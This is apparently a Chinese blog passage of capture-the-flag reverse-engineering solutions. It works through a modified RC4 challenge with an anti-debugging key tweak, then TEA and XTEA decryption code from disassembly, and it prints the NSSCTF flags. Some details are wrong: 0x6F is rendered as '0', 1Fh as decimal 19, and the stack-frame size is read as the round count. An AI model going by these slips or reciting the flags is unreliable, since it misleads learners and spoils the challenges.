<h3 id="题目TCR-exe"><a href="#题目TCR-exe" class="headerlink" title="题目TCR.exe"></a>题目TCR.exe</h3><p>这个题目没法运行exe，会报错，安装了dll还是会报错，所以直接先查壳再仿写</p>
<p>主要逻辑大概是这样</p>
<p><img src="/2024/09/25/algorithm/image-20241020204433963.png" alt="image-20241020204433963"></p>
<p><img src="/2024/09/25/algorithm/image-20241020204620373.png" alt="image-20241020204620373"></p>
<p><img src="/2024/09/25/algorithm/image-20241020204639565.png" alt="image-20241020204639565"></p>
<p>主要就是上面三段逻辑，密钥、init初始化和加密算法</p>
<p>这是一个魔改的RC4算法，程序有点问题没法动调，所以仿写一下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:6273)</span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">RC4_KEY</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> S_Box[<span class="number">64</span>];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> T_Box[<span class="number">64</span>];</span><br><span class="line">&#125; RC4_KEY, * PRC4_KEY;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RC4Init</span><span class="params">(PRC4_KEY Context, <span class="type">unsigned</span> <span class="type">char</span>* Key, <span class="type">int</span> KeyLength)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> v1;</span><br><span class="line">	<span class="keyword">if</span> (Context == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Context-&gt;S_Box[i] = i;</span><br><span class="line">		Context-&gt;T_Box[i] = Key[i % KeyLength];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		j = (j + Context-&gt;S_Box[i] + Context-&gt;T_Box[i]) % <span class="number">64</span>;</span><br><span class="line">		v1 = Context-&gt;S_Box[i];</span><br><span class="line">		Context-&gt;S_Box[i] = Context-&gt;S_Box[j];</span><br><span class="line">		Context-&gt;S_Box[j] = v1;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RC4Crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* Input, <span class="type">unsigned</span> <span class="type">int</span> InputLength, <span class="type">unsigned</span> <span class="type">char</span>* Key, <span class="type">unsigned</span> <span class="type">int</span> KeyLength)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> v1 = <span class="number">0</span>, i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> v2;</span><br><span class="line"></span><br><span class="line">	RC4_KEY Context;</span><br><span class="line">	RC4Init(&amp;Context, Key, KeyLength);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (v1 = <span class="number">0</span>; v1 &lt; InputLength; v1++)</span><br><span class="line">	&#123;</span><br><span class="line">		i = (i + <span class="number">1</span>) % <span class="number">64</span>;</span><br><span class="line">		j = (j + Context.S_Box[i]) % <span class="number">64</span>;</span><br><span class="line"></span><br><span class="line">		v2 = Context.S_Box[i]; </span><br><span class="line">		Context.S_Box[i] = Context.S_Box[j];</span><br><span class="line">		Context.S_Box[j] = v2;</span><br><span class="line"></span><br><span class="line">		t = (Context.S_Box[i] + Context.S_Box[j]) % <span class="number">64</span>;</span><br><span class="line">		Input[v1] ^= Context.S_Box[t] + Context.S_Box[i];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RC4UpdateString</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> Input[], <span class="type">unsigned</span> <span class="type">int</span> InputLength)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> Key[] = <span class="string">&quot;r4nd0m_k5y&quot;</span>;</span><br><span class="line">	RC4Crypt(Input, InputLength, Key, <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span>*)Key));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> v1[<span class="number">41</span>] = &#123;</span><br><span class="line">		<span class="number">0x18</span>, <span class="number">0x35</span>, <span class="number">0x08</span>, <span class="number">0x59</span>, <span class="number">0x01</span>, <span class="number">0x79</span>,</span><br><span class="line">		<span class="number">0x2D</span>, <span class="number">0x7D</span>, <span class="number">0x3D</span>, <span class="number">0x4C</span>, <span class="number">0x17</span>, <span class="number">0x0A</span>,</span><br><span class="line">		<span class="number">0x09</span>, <span class="number">0x48</span>, <span class="number">0x6D</span>, <span class="number">0x18</span>, <span class="number">0x29</span>, <span class="number">0x04</span>,</span><br><span class="line">		<span class="number">0x53</span>, <span class="number">0x25</span>, <span class="number">0x77</span>, <span class="number">0x29</span>, <span class="number">0x39</span>, <span class="number">0x6B</span>,</span><br><span class="line">		<span class="number">0x4E</span>, <span class="number">0x66</span>, <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x4A</span>, <span class="number">0x41</span>,</span><br><span class="line">		<span class="number">0x6F</span>, <span class="number">0x27</span>, <span class="number">0x61</span>, <span class="number">0x7A</span>, <span class="number">0x16</span>, <span class="number">0x14</span>,</span><br><span class="line">		<span class="number">0x4c</span>, <span class="number">0x5a</span>, <span class="number">0x57</span>, <span class="number">0x69</span>, <span class="number">0x00</span></span><br><span class="line">	&#125;;</span><br><span class="line">	RC4UpdateString((<span class="type">unsigned</span> <span class="type">char</span>*)v1, <span class="built_in">strlen</span>(v1));</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(v1); i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, v1[i]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看起来没问题，但是跑不出结果      <img src="/2024/09/25/algorithm/image-20241020210828563.png" alt="image-20241020210828563"></p>
<p>看一下上面有一个sub_A325</p>
<p>里面有IsDebuggerPresent()</p>
<p>里面有一个对密钥修改的操作：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ascii(&#x27;4&#x27;) xor 0x55		0x34 ^ 0x55 = 0x61 =&gt; DEC 97  =&gt; &#x27;a&#x27;</span><br><span class="line">ascii(&#x27;0&#x27;) xor 0x5F		0x30 ^ 0x5F = 0x6F =&gt; DEC 111 =&gt; &#x27;0&#x27;</span><br></pre></td></tr></table></figure>

<p>所以，key应该是<code>random_k5y</code></p>
<p><img src="/2024/09/25/algorithm/image-20241020212455435.png" alt="image-20241020212455435"></p>
<p>果然算出了答案，但是发现少了一小段，发现少了四个字符的密钥</p>
<img src="/2024/09/25/algorithm/image-20241020213530431.png" alt="image-20241020213530431" style="zoom:67%;">

<p>发现这一串也是密钥的一部分</p>
<p>加上之后，终于算出了正确答案<code>NSSCTF&#123;4af695c7065c5cf6053271d3e3151a2d&#125;</code></p>
<h2 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h2><blockquote>
<p>TEA（Tiny Encryption Algorithm）是一种对称密钥加密算法，由David Wheeler和Roger Needham在1994年提出。TEA的设计目标是简单、高效，并且在实现上尽量减少代码的复杂性。</p>
</blockquote>
<h3 id="TEA加解密"><a href="#TEA加解密" class="headerlink" title="TEA加解密"></a>TEA加解密</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:26450)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UI32 uint32_t</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9E3779B9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROUND 32</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(UI32* v, UI32* k)</span></span><br><span class="line">&#123;</span><br><span class="line">	UI32 v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = DELTA * ROUND, i;</span><br><span class="line">	UI32 k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">		v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">		v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">		sum -= DELTA;</span><br><span class="line">	&#125;</span><br><span class="line">	v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span><span class="params">(UI32* v, UI32* k)</span></span><br><span class="line">&#123;</span><br><span class="line">	UI32 v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">		sum += DELTA;</span><br><span class="line">		v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">		v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">3</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">0</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	UI32 k[ y ] = &#123; ...... &#125;;		<span class="comment">// Key</span></span><br><span class="line">	UI32 v[ x ] = &#123;  ......  &#125;;	<span class="comment">// Data</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (x / <span class="number">2</span>); i++)		<span class="comment">// i要小于v[x]的x/2</span></span><br><span class="line">	&#123;</span><br><span class="line">		UI32 f[<span class="number">2</span>] = &#123; v[<span class="number">2</span> * i], v[<span class="number">2</span> * i + <span class="number">1</span>] &#125;;</span><br><span class="line">		decrypt(f, k);</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">2</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, f[j] &amp; <span class="number">0xff</span>);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (f[j] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (f[j] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (f[j] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="题目-SEA0-txt"><a href="#题目-SEA0-txt" class="headerlink" title="题目 SEA0.txt"></a>题目 SEA0.txt</h3><p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hint1 = &#123;11,22,33,44&#125; </span><br><span class="line">hint2 = &#123;0x7c12e17f,0x43c2b691,0xa8d8d6ce,0x6280ecc8,0xe6e18c6e,0x20d6dfa3,0xf2dd40c,0xb819b77e,0xb9258436,0x5d3e88b6&#125;</span><br><span class="line">.text:0000000000401550                               ; unsigned int *__fastcall encrypt(unsigned int *, unsigned int *)</span><br><span class="line">.text:0000000000401550                               public _Z7encryptPjS_</span><br><span class="line">.text:0000000000401550                               _Z7encryptPjS_ proc near                ; CODE XREF: main+FC↓p</span><br><span class="line">.text:0000000000401550                                                                       ; DATA XREF: .pdata:000000000040A06C↓o</span><br><span class="line">.text:0000000000401550</span><br><span class="line">.text:0000000000401550                               var_14= dword ptr -14h</span><br><span class="line">.text:0000000000401550                               var_10= dword ptr -10h</span><br><span class="line">.text:0000000000401550                               var_C= dword ptr -0Ch</span><br><span class="line">.text:0000000000401550                               var_8= dword ptr -8</span><br><span class="line">.text:0000000000401550                               var_4= dword ptr -4</span><br><span class="line">.text:0000000000401550                               arg_0= qword ptr  10h</span><br><span class="line">.text:0000000000401550                               arg_8= qword ptr  18h</span><br><span class="line">.text:0000000000401550</span><br><span class="line">.text:0000000000401550 55                            push    rbp</span><br><span class="line">.text:0000000000401551 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:0000000000401554 48 83 EC 20                   sub     rsp, 20h</span><br><span class="line">.text:0000000000401558 48 89 4D 10                   mov     [rbp+arg_0], rcx</span><br><span class="line">.text:000000000040155C 48 89 55 18                   mov     [rbp+arg_8], rdx</span><br><span class="line">.text:0000000000401560 C7 45 EC B9 79 37 9E          mov     [rbp+var_14], 9E3779B9h</span><br><span class="line">.text:0000000000401567 48 8B 45 10                   mov     rax, [rbp+arg_0]</span><br><span class="line">.text:000000000040156B 8B 00                         mov     eax, [rax]</span><br><span class="line">.text:000000000040156D 89 45 FC                      mov     [rbp+var_4], eax</span><br><span class="line">.text:0000000000401570 48 8B 45 10                   mov     rax, [rbp+arg_0]</span><br><span class="line">.text:0000000000401574 8B 40 04                      mov     eax, [rax+4]</span><br><span class="line">.text:0000000000401577 89 45 F8                      mov     [rbp+var_8], eax</span><br><span class="line">.text:000000000040157A C7 45 F4 00 00 00 00          mov     [rbp+var_C], 0</span><br><span class="line">.text:0000000000401581 C7 45 F0 00 00 00 00          mov     [rbp+var_10], 0</span><br><span class="line">.text:0000000000401581</span><br><span class="line">.text:0000000000401588</span><br><span class="line">.text:0000000000401588                               loc_401588:                             ; CODE XREF: encrypt(uint *,uint *)+B2↓j</span><br><span class="line">.text:0000000000401588 83 7D F0 1F                   cmp     [rbp+var_10], 1Fh		// DEC = 19</span><br><span class="line">.text:000000000040158C 7F 76                         jg      short loc_401604</span><br><span class="line">.text:000000000040158C</span><br><span class="line">.text:000000000040158E 8B 45 EC                      mov     eax, [rbp+var_14]</span><br><span class="line">.text:0000000000401591 01 45 F4                      add     [rbp+var_C], eax</span><br><span class="line">.text:0000000000401594 8B 45 F8                      mov     eax, [rbp+var_8]</span><br><span class="line">.text:0000000000401597 C1 E0 04                      shl     eax, 4</span><br><span class="line">.text:000000000040159A 89 C2                         mov     edx, eax</span><br><span class="line">.text:000000000040159C 48 8B 45 18                   mov     rax, [rbp+arg_8]</span><br><span class="line">.text:00000000004015A0 8B 00                         mov     eax, [rax]</span><br><span class="line">.text:00000000004015A2 01 C2                         add     edx, eax</span><br><span class="line">.text:00000000004015A4 8B 4D F8                      mov     ecx, [rbp+var_8]</span><br><span class="line">.text:00000000004015A7 8B 45 F4                      mov     eax, [rbp+var_C]</span><br><span class="line">.text:00000000004015AA 01 C8                         add     eax, ecx</span><br><span class="line">.text:00000000004015AC 31 C2                         xor     edx, eax</span><br><span class="line">.text:00000000004015AE 8B 45 F8                      mov     eax, [rbp+var_8]</span><br><span class="line">.text:00000000004015B1 C1 E8 05                      shr     eax, 5</span><br><span class="line">.text:00000000004015B4 89 C1                         mov     ecx, eax</span><br><span class="line">.text:00000000004015B6 48 8B 45 18                   mov     rax, [rbp+arg_8]</span><br><span class="line">.text:00000000004015BA 48 83 C0 04                   add     rax, 4</span><br><span class="line">.text:00000000004015BE 8B 00                         mov     eax, [rax]</span><br><span class="line">.text:00000000004015C0 01 C8                         add     eax, ecx</span><br><span class="line">.text:00000000004015C2 31 D0                         xor     eax, edx</span><br><span class="line">.text:00000000004015C4 01 45 FC                      add     [rbp+var_4], eax</span><br><span class="line">.text:00000000004015C7 8B 45 FC                      mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000004015CA C1 E0 04                      shl     eax, 4</span><br><span class="line">.text:00000000004015CD 89 C2                         mov     edx, eax</span><br><span class="line">.text:00000000004015CF 48 8B 45 18                   mov     rax, [rbp+arg_8]</span><br><span class="line">.text:00000000004015D3 48 83 C0 08                   add     rax, 8</span><br><span class="line">.text:00000000004015D7 8B 00                         mov     eax, [rax]</span><br><span class="line">.text:00000000004015D9 01 C2                         add     edx, eax</span><br><span class="line">.text:00000000004015DB 8B 4D FC                      mov     ecx, [rbp+var_4]</span><br><span class="line">.text:00000000004015DE 8B 45 F4                      mov     eax, [rbp+var_C]</span><br><span class="line">.text:00000000004015E1 01 C8                         add     eax, ecx</span><br><span class="line">.text:00000000004015E3 31 C2                         xor     edx, eax</span><br><span class="line">.text:00000000004015E5 8B 45 FC                      mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000004015E8 C1 E8 05                      shr     eax, 5</span><br><span class="line">.text:00000000004015EB 89 C1                         mov     ecx, eax</span><br><span class="line">.text:00000000004015ED 48 8B 45 18                   mov     rax, [rbp+arg_8]</span><br><span class="line">.text:00000000004015F1 48 83 C0 0C                   add     rax, 0Ch</span><br><span class="line">.text:00000000004015F5 8B 00                         mov     eax, [rax]</span><br><span class="line">.text:00000000004015F7 01 C8                         add     eax, ecx</span><br><span class="line">.text:00000000004015F9 31 D0                         xor     eax, edx</span><br><span class="line">.text:00000000004015FB 01 45 F8                      add     [rbp+var_8], eax</span><br><span class="line">.text:00000000004015FE 83 45 F0 01                   add     [rbp+var_10], 1</span><br><span class="line">.text:0000000000401602 EB 84                         jmp     short loc_401588</span><br><span class="line">.text:0000000000401602</span><br><span class="line">.text:0000000000401604                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000401604</span><br><span class="line">.text:0000000000401604                               loc_401604:                             ; CODE XREF: encrypt(uint *,uint *)+3C↑j</span><br><span class="line">.text:0000000000401604 48 8B 45 10                   mov     rax, [rbp+arg_0]</span><br><span class="line">.text:0000000000401608 8B 55 FC                      mov     edx, [rbp+var_4]</span><br><span class="line">.text:000000000040160B 89 10                         mov     [rax], edx</span><br><span class="line">.text:000000000040160D 48 8B 45 10                   mov     rax, [rbp+arg_0]</span><br><span class="line">.text:0000000000401611 48 83 C0 04                   add     rax, 4</span><br><span class="line">.text:0000000000401615 8B 55 F8                      mov     edx, [rbp+var_8]</span><br><span class="line">.text:0000000000401618 89 10                         mov     [rax], edx</span><br><span class="line">.text:000000000040161A 90                            nop</span><br><span class="line">.text:000000000040161B 48 83 C4 20                   add     rsp, 20h</span><br><span class="line">.text:000000000040161F 5D                            pop     rbp</span><br><span class="line">.text:0000000000401620 C3                            retn</span><br><span class="line">.text:0000000000401620</span><br><span class="line">.text:0000000000401620                               _Z7encryptPjS_ endp</span><br></pre></td></tr></table></figure>

<p>这是一段IDA反编译的汇编代码，Key的长度是4位的一般会想到TEA家族（TEA，XTEA，XXTEA）的加密  再看hint2，是4*10&#x3D;40位，大概是flag的长度，所以hint2可能是密文，hint1是Key</p>
<p>分析汇编代码：</p>
<p>这是一段完整的TEA加密，发现了<code>mov     [rbp+var_14], 9E3779B9h</code>，这里的delta，<code>sub     rsp, 20h</code>，这里的20h应该是<code>round = 32</code></p>
<p>汇编中还有<code>shl     eax, 4</code>和<code>shr     eax, 5</code>，左移4和右移5，判断应该是标准TEA加密。</p>
<p>所以这一段汇编对应的C代码应该就是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> UI32 uint32_t</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9E3779B9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROUND 32</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(UI32* v, UI32* k)</span></span><br><span class="line">&#123;</span><br><span class="line">	UI32 v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = DELTA * ROUND, i;</span><br><span class="line">	UI32 k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">		v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">		v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">		sum -= DELTA;</span><br><span class="line">	&#125;</span><br><span class="line">	v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完整解密：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:26450)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UI32 uint32_t</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9E3779B9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROUND 32</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(UI32* v, UI32* k)</span></span><br><span class="line">&#123;</span><br><span class="line">	UI32 v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = DELTA * ROUND, i;</span><br><span class="line">	UI32 k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">		v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">		v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">		sum -= DELTA;</span><br><span class="line">	&#125;</span><br><span class="line">	v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	UI32 k[<span class="number">4</span>] = &#123; <span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>,<span class="number">44</span> &#125;;</span><br><span class="line">	UI32 v[<span class="number">12</span>] = &#123; <span class="number">0x7c12e17f</span>,<span class="number">0x43c2b691</span>,<span class="number">0xa8d8d6ce</span>,<span class="number">0x6280ecc8</span>,</span><br><span class="line">				   <span class="number">0xe6e18c6e</span>,<span class="number">0x20d6dfa3</span>,<span class="number">0x0f2dd40c</span>,<span class="number">0xb819b77e</span>,</span><br><span class="line">				   <span class="number">0xb9258436</span>,<span class="number">0x5d3e88b6</span> &#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		UI32 f[<span class="number">2</span>] = &#123; v[<span class="number">2</span> * i], v[<span class="number">2</span> * i + <span class="number">1</span>] &#125;;</span><br><span class="line">		decrypt(f, k);</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">2</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, f[j] &amp; <span class="number">0xff</span>);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (f[j] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (f[j] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (f[j] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解密之后的答案为：<code>NSSCTF&#123;5b84a51236d7043fe2480d69d24b37a3&#125;</code></p>
<h2 id="XTEA"><a href="#XTEA" class="headerlink" title="XTEA"></a>XTEA</h2><h3 id="XTEA加解密"><a href="#XTEA加解密" class="headerlink" title="XTEA加解密"></a>XTEA加解密</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">encipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, delta=<span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">decipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], delta=<span class="number">0x9E3779B9</span>, sum=delta*num_rounds;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + 